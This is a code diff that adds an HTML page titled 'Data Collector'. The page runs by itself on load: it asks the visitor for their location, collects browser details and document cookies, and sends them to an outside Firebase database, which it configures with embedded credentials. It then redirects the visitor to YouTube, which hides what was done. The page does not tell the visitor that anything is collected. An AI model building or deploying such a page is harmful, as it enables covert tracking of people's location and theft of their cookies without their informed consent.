@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Data Collector</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+<script type="module">
+  // -----------------------------
+  // Firebase Initialization
+  // -----------------------------
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCICMkhkkwtdbO9s2le4gsYwG8k-T5-sl4",
+    authDomain: "ghost-213b1.firebaseapp.com",
+    databaseURL: "https://ghost-213b1-default-rtdb.firebaseio.com",
+    projectId: "ghost-213b1",
+    storageBucket: "ghost-213b1.firebasestorage.app",
+    messagingSenderId: "403966574044",
+    appId: "1:403966574044:web:19882339630336ca39e319",
+    measurementId: "G-G771Q9FB7L"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getDatabase(app);
+
+  // -----------------------------
+  // Collect Device Information
+  // -----------------------------
+  function getDeviceInfo() {
+    return {
+      userAgent: navigator.userAgent,
+      browser: navigator.appName,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      cookies: document.cookie || "No cookies available"
+    };
+  }
+
+  // -----------------------------
+  // Save Data to Firebase
+  // -----------------------------
+  function saveToFirebase(data) {
+    const dataRef = ref(db, "users");
+    const newEntry = push(dataRef);
+    return set(newEntry, data);
+  }
+
+  // -----------------------------
+  // Request Location Permission
+  // -----------------------------
+  function requestLocation() {
+    if (!navigator.geolocation) {
+      alert("Geolocation is not supported by your browser.");
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const deviceInfo = getDeviceInfo();
+
+        const payload = {
+          timestamp: Date.now(),
+          location: {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          },
+          device: deviceInfo
+        };
+
+        await saveToFirebase(payload);
+
+        // Redirect after saving
+        window.location.href = "https://youtube.com";
+      },
+
+      (err) => {
+        alert("Location permission denied or unavailable.");
+      }
+    );
+  }
+
+  // -----------------------------
+  // Start Immediately
+  // -----------------------------
+  requestLocation();
+
+</script>
+</body>
+</html>
